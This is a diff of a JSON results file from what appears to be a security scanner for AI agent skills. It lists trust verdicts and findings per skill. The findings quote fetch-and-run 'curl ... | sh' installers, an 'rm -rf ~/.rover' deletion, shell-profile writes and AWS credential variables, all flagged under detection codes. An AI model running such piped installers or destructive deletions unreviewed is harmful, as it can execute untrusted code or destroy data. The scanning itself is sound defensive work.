@@ -1,5 +1,5 @@
 {
-  "generatedAt": "2026-05-27T02:04:50.402Z",
+  "generatedAt": "2026-05-27T02:52:50.551Z",
   "entries": {
     "pdf": {
       "ref": "anthropics/skills@pdf",
@@ -1620,15 +1620,15 @@
       ]
     },
     "domain-name-brainstormer": {
-      "ref": "softaworks/agent-toolkit@domain-name-brainstormer",
+      "ref": "composiohq/awesome-claude-skills@domain-name-brainstormer",
       "skillKey": "domain-name-brainstormer",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:58:51.333Z",
+      "scannedAt": "2026-05-27T02:50:51.381Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/softaworks/agent-toolkit is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
@@ -1783,15 +1783,15 @@
       ]
     },
     "humanizer": {
-      "ref": "softaworks/agent-toolkit@humanizer",
+      "ref": "daleseo/korean-skills@humanizer",
       "skillKey": "humanizer",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:58:51.344Z",
+      "scannedAt": "2026-05-27T02:50:54.435Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/softaworks/agent-toolkit is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/daleseo/korean-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
@@ -2736,15 +2736,15 @@
       ]
     },
     "playwright-skill": {
-      "ref": "sickn33/antigravity-awesome-skills@playwright-skill",
+      "ref": "lackeyjb/playwright-skill@playwright-skill",
       "skillKey": "playwright-skill",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:59:35.049Z",
+      "scannedAt": "2026-05-27T02:51:27.590Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/lackeyjb/playwright-skill is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
@@ -5823,80 +5823,80 @@
       ]
     },
     "vue-router-best-practices": {
-      "ref": "vuejs-ai/skills@vue-router-best-practices",
+      "ref": "hyf0/vue-skills@vue-router-best-practices",
       "skillKey": "vue-router-best-practices",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:59:58.862Z",
+      "scannedAt": "2026-05-27T02:51:18.332Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/vuejs-ai/skills is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/hyf0/vue-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
     "vue-pinia-best-practices": {
-      "ref": "vuejs-ai/skills@vue-pinia-best-practices",
+      "ref": "hyf0/vue-skills@vue-pinia-best-practices",
       "skillKey": "vue-pinia-best-practices",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:59:58.863Z",
+      "scannedAt": "2026-05-27T02:51:18.331Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/vuejs-ai/skills is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/hyf0/vue-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
     "create-adaptable-composable": {
-      "ref": "vuejs-ai/skills@create-adaptable-composable",
+      "ref": "hyf0/vue-skills@create-adaptable-composable",
       "skillKey": "create-adaptable-composable",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:59:58.863Z",
+      "scannedAt": "2026-05-27T02:51:18.328Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/vuejs-ai/skills is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/hyf0/vue-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
     "vue-options-api-best-practices": {
-      "ref": "vuejs-ai/skills@vue-options-api-best-practices",
+      "ref": "hyf0/vue-skills@vue-options-api-best-practices",
       "skillKey": "vue-options-api-best-practices",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:59:58.864Z",
+      "scannedAt": "2026-05-27T02:51:18.330Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/vuejs-ai/skills is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/hyf0/vue-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
     "vue-testing-best-practices": {
-      "ref": "vuejs-ai/skills@vue-testing-best-practices",
+      "ref": "hyf0/vue-skills@vue-testing-best-practices",
       "skillKey": "vue-testing-best-practices",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:59:58.867Z",
+      "scannedAt": "2026-05-27T02:51:18.334Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/vuejs-ai/skills is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/hyf0/vue-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
     "vue-jsx-best-practices": {
-      "ref": "vuejs-ai/skills@vue-jsx-best-practices",
+      "ref": "hyf0/vue-skills@vue-jsx-best-practices",
       "skillKey": "vue-jsx-best-practices",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T00:59:58.867Z",
+      "scannedAt": "2026-05-27T02:51:18.328Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/vuejs-ai/skills is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/hyf0/vue-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
@@ -6178,15 +6178,15 @@
       ]
     },
     "prd": {
-      "ref": "snarktank/ralph@prd",
+      "ref": "github/awesome-copilot@prd",
       "skillKey": "prd",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T01:00:48.536Z",
+      "scannedAt": "2026-05-27T02:51:13.052Z",
       "findings": [
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/snarktank/ralph is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/github/awesome-copilot is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     },
@@ -6250,10 +6250,10 @@
       ]
     },
     "cloudflare": {
-      "ref": "dmmulroy/cloudflare-skill@cloudflare",
+      "ref": "cloudflare/skills@cloudflare",
       "skillKey": "cloudflare",
       "verdict": "needs_review",
-      "scannedAt": "2026-05-27T01:01:35.156Z",
+      "scannedAt": "2026-05-27T02:50:49.535Z",
       "findings": [
         {
           "severity": "warning",
@@ -6351,7 +6351,7 @@
           "code": "pip_install",
           "message": "Installs Python packages via pip.",
           "file": "references/sandbox/README.md",
-          "excerpt": "cloudflare/sandbox:latest RUN pip3 install --no-cache-dir pandas numpy m"
+          "excerpt": "/cloudflare/sandbox:0.7.0 RUN pip3 install --no-cache-dir pandas numpy m"
         },
         {
           "severity": "warning",
@@ -6365,21 +6365,21 @@
           "code": "pip_install",
           "message": "Installs Python packages via pip.",
           "file": "references/sandbox/configuration.md",
-          "excerpt": "cloudflare/sandbox:latest RUN pip3 install --no-cache-dir pandas numpy E"
+          "excerpt": "/cloudflare/sandbox:0.7.0 RUN pip3 install --no-cache-dir pandas numpy E"
         },
         {
           "severity": "info",
           "code": "pip_install",
           "message": "Installs Python packages via pip.",
           "file": "references/sandbox/configuration.md",
-          "excerpt": "cloudflare/sandbox:latest RUN pip3 install --no-cache-dir \\ jupyter-"
+          "excerpt": "/cloudflare/sandbox:0.7.0 RUN pip3 install --no-cache-dir \\ jupyter-"
         },
         {
           "severity": "info",
           "code": "npm_install_global",
           "message": "Installs Node packages globally.",
           "file": "references/sandbox/configuration.md",
-          "excerpt": "cloudflare/sandbox:latest RUN npm install -g typescript ts-node ``` **CRI"
+          "excerpt": "/cloudflare/sandbox:0.7.0 RUN npm install -g typescript ts-node ``` **CRI"
         },
         {
           "severity": "warning",
@@ -6407,7 +6407,7 @@
           "code": "npm_install_global",
           "message": "Installs Node packages globally.",
           "file": "references/sandbox/patterns.md",
-          "excerpt": "cloudflare/sandbox:latest RUN npm install -g ws EXPOSE 8080 ``` ## Proces"
+          "excerpt": "/cloudflare/sandbox:0.7.0 RUN npm install -g ws EXPOSE 8080 ``` ## Proces"
         },
         {
           "severity": "info",
@@ -6440,7 +6440,3796 @@
         {
           "severity": "warning",
           "code": "untrusted_origin",
-          "message": "Origin github.com/dmmulroy/cloudflare-skill is not on the trusted-org allowlist; review the maintainer."
+          "message": "Origin github.com/cloudflare/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "performance": {
+      "ref": "addyosmani/web-quality-skills@performance",
+      "skillKey": "performance",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:31.871Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/addyosmani/web-quality-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "clickhouse-io": {
+      "ref": "affaan-m/everything-claude-code@clickhouse-io",
+      "skillKey": "clickhouse-io",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.118Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "continuous-learning": {
+      "ref": "affaan-m/everything-claude-code@continuous-learning",
+      "skillKey": "continuous-learning",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.119Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "continuous-learning-v2": {
+      "ref": "affaan-m/everything-claude-code@continuous-learning-v2",
+      "skillKey": "continuous-learning-v2",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.124Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "eval-harness": {
+      "ref": "affaan-m/everything-claude-code@eval-harness",
+      "skillKey": "eval-harness",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.125Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "golang-patterns": {
+      "ref": "affaan-m/everything-claude-code@golang-patterns",
+      "skillKey": "golang-patterns",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.125Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "golang-testing": {
+      "ref": "affaan-m/everything-claude-code@golang-testing",
+      "skillKey": "golang-testing",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.126Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "iterative-retrieval": {
+      "ref": "affaan-m/everything-claude-code@iterative-retrieval",
+      "skillKey": "iterative-retrieval",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.126Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "postgres-patterns": {
+      "ref": "affaan-m/everything-claude-code@postgres-patterns",
+      "skillKey": "postgres-patterns",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.127Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "strategic-compact": {
+      "ref": "affaan-m/everything-claude-code@strategic-compact",
+      "skillKey": "strategic-compact",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:33.127Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/affaan-m/everything-claude-code is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "ios-swift-development": {
+      "ref": "aj-geddes/useful-ai-prompts@ios-swift-development",
+      "skillKey": "ios-swift-development",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:37.697Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/aj-geddes/useful-ai-prompts is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "android-kotlin": {
+      "ref": "alinaqi/claude-bootstrap@android-kotlin",
+      "skillKey": "android-kotlin",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:38.720Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/alinaqi/claude-bootstrap is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "flutter": {
+      "ref": "alinaqi/claude-bootstrap@flutter",
+      "skillKey": "flutter",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:38.720Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/alinaqi/claude-bootstrap is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "terraform-skill": {
+      "ref": "antonbabenko/terraform-skill@terraform-skill",
+      "skillKey": "terraform-skill",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:43.128Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/quick-reference.md",
+          "excerpt": "AWS_ACCESS_KEY_ID=... export AWS_SECRET_ACCESS_KEY=... # Try migration again te"
+        },
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "references/security-compliance.md",
+          "excerpt": "S brew install trivy # Linux curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local…"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/security-compliance.md",
+          "excerpt": "\"AKIAIOSFODNN7EXAMPLE\" export AWS_SECRET_ACCESS_KEY=\"wJalrXUtnFEMI/K7MDENG/bPxRfi"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/antonbabenko/terraform-skill is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "apollo-client": {
+      "ref": "apollographql/skills@apollo-client",
+      "skillKey": "apollo-client",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:43.570Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/apollographql/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "apollo-connectors": {
+      "ref": "apollographql/skills@apollo-connectors",
+      "skillKey": "apollo-connectors",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:43.571Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/apollographql/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "apollo-mcp-server": {
+      "ref": "apollographql/skills@apollo-mcp-server",
+      "skillKey": "apollo-mcp-server",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:43.572Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "SKILL.md",
+          "excerpt": "tall ```bash # Linux / MacOS curl -sSL https://mcp.apollo.dev/download/nix/latest | sh # Windows iwr 'https://mcp.a"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/apollographql/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "apollo-server": {
+      "ref": "apollographql/skills@apollo-server",
+      "skillKey": "apollo-server",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:43.574Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/apollographql/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "graphql-operations": {
+      "ref": "apollographql/skills@graphql-operations",
+      "skillKey": "graphql-operations",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:43.576Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/apollographql/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "graphql-schema": {
+      "ref": "apollographql/skills@graphql-schema",
+      "skillKey": "graphql-schema",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:43.577Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/apollographql/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rover": {
+      "ref": "apollographql/skills@rover",
+      "skillKey": "rover",
+      "verdict": "rejected",
+      "scannedAt": "2026-05-27T02:50:43.578Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "SKILL.md",
+          "excerpt": "nstall ```bash # macOS/Linux curl -sSL https://rover.apollo.dev/nix/latest | sh # npm (cross-platform) npm i"
+        },
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "SKILL.md",
+          "excerpt": "| sh # npm (cross-platform) npm install -g @apollo/rover # Windows Powe"
+        },
+        {
+          "severity": "critical",
+          "code": "rm_rf_root",
+          "message": "Recursive deletion of root, home, or $HOME — destructive.",
+          "file": "references/configuration.md",
+          "excerpt": "tion ```bash # Remove binary rm -rf ~/.rover # Remove from PATH (i"
+        },
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "references/configuration.md",
+          "excerpt": "bash # Install latest version curl -sSL https://rover.apollo.dev/nix/latest | sh # Install specific version c"
+        },
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "references/configuration.md",
+          "excerpt": "h # Install specific version curl -sSL https://rover.apollo.dev/nix/v0.26.0 | sh # Add to PATH (if not automa"
+        },
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "references/configuration.md",
+          "excerpt": "llo/rover # curl (reinstall) curl -sSL https://rover.apollo.dev/nix/latest | sh ``` ## Uninstalling ### npm"
+        },
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "references/configuration.md",
+          "excerpt": "rm) ```bash # Global install npm install -g @apollo/rover # Project-loca"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/apollographql/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "astro": {
+      "ref": "astrolicious/agent-skills@astro",
+      "skillKey": "astro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:44.550Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/astrolicious/agent-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "html-to-pdf": {
+      "ref": "aviz85/claude-skills-library@html-to-pdf",
+      "skillKey": "html-to-pdf",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:45.481Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/aviz85/claude-skills-library is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "mermaid-visualizer": {
+      "ref": "axtonliu/axton-obsidian-visual-skills@mermaid-visualizer",
+      "skillKey": "mermaid-visualizer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:45.864Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/axtonliu/axton-obsidian-visual-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "base44-cli": {
+      "ref": "base44/skills@base44-cli",
+      "skillKey": "base44-cli",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:46.256Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "SKILL.md",
+          "excerpt": "| If prompted to update, run `npm install -g base44@latest` (or use npx fo"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/base44/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "base44-sdk": {
+      "ref": "base44/skills@base44-sdk",
+      "skillKey": "base44-sdk",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:46.259Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/base44/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "bfl-api": {
+      "ref": "black-forest-labs/skills@bfl-api",
+      "skillKey": "bfl-api",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:48.583Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/black-forest-labs/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "flux-best-practices": {
+      "ref": "black-forest-labs/skills@flux-best-practices",
+      "skillKey": "flux-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:48.587Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/black-forest-labs/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "deslop": {
+      "ref": "brianlovin/claude-config@deslop",
+      "skillKey": "deslop",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:48.958Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/brianlovin/claude-config is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "knip": {
+      "ref": "brianlovin/claude-config@knip",
+      "skillKey": "knip",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:48.958Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/brianlovin/claude-config is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rams": {
+      "ref": "brianlovin/claude-config@rams",
+      "skillKey": "rams",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:48.959Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/brianlovin/claude-config is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "artifacts-builder": {
+      "ref": "composiohq/awesome-claude-skills@artifacts-builder",
+      "skillKey": "artifacts-builder",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.379Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "npm_install_global",
+          "message": "Installs Node packages globally.",
+          "file": "scripts/init-artifact.sh",
+          "excerpt": "found. Installing pnpm...\" npm install -g pnpm fi # Check if project n"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "competitive-ads-extractor": {
+      "ref": "composiohq/awesome-claude-skills@competitive-ads-extractor",
+      "skillKey": "competitive-ads-extractor",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.380Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "connect": {
+      "ref": "composiohq/awesome-claude-skills@connect",
+      "skillKey": "connect",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.380Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "``` ### 3. Install ```bash pip install composio # Python np"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "------| | Claude Agent SDK | `pip install composio claude-agent-sdk` |"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "ent-sdk` | | OpenAI Agents | `pip install composio openai-agents` | | V"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "osio/vercel` | | LangChain | `pip install composio-langchain` | | Any M"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "connect-apps": {
+      "ref": "composiohq/awesome-claude-skills@connect-apps",
+      "skillKey": "connect-apps",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.380Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "developer-growth-analysis": {
+      "ref": "composiohq/awesome-claude-skills@developer-growth-analysis",
+      "skillKey": "developer-growth-analysis",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.381Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "image-enhancer": {
+      "ref": "composiohq/awesome-claude-skills@image-enhancer",
+      "skillKey": "image-enhancer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.381Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "invoice-organizer": {
+      "ref": "composiohq/awesome-claude-skills@invoice-organizer",
+      "skillKey": "invoice-organizer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.382Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "langsmith-fetch": {
+      "ref": "composiohq/awesome-claude-skills@langsmith-fetch",
+      "skillKey": "langsmith-fetch",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.382Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "dotfile_write",
+          "message": "Writes to user shell init files (persistence vector).",
+          "file": "SKILL.md",
+          "excerpt": "LANGSMITH_API_KEY=\"your_key\"' >> ~/.bashrc echo 'export LANGSMITH_PROJEC"
+        },
+        {
+          "severity": "warning",
+          "code": "dotfile_write",
+          "message": "Writes to user shell init files (persistence vector).",
+          "file": "SKILL.md",
+          "excerpt": "SMITH_PROJECT=\"your_project\"' >> ~/.bashrc # Reload shell config source"
+        },
+        {
+          "severity": "info",
+          "code": "pip_install",
+          "message": "Installs Python packages via pip.",
+          "file": "SKILL.md",
+          "excerpt": "stall langsmith-fetch ```bash pip install langsmith-fetch ``` ### 2. S"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "meeting-insights-analyzer": {
+      "ref": "composiohq/awesome-claude-skills@meeting-insights-analyzer",
+      "skillKey": "meeting-insights-analyzer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.387Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "raffle-winner-picker": {
+      "ref": "composiohq/awesome-claude-skills@raffle-winner-picker",
+      "skillKey": "raffle-winner-picker",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:50:51.387Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/composiohq/awesome-claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "skill-share": {
+      "ref": "composiohq/awesome-claude-skills@skill-share",
+      "skillKey": "skill-share",
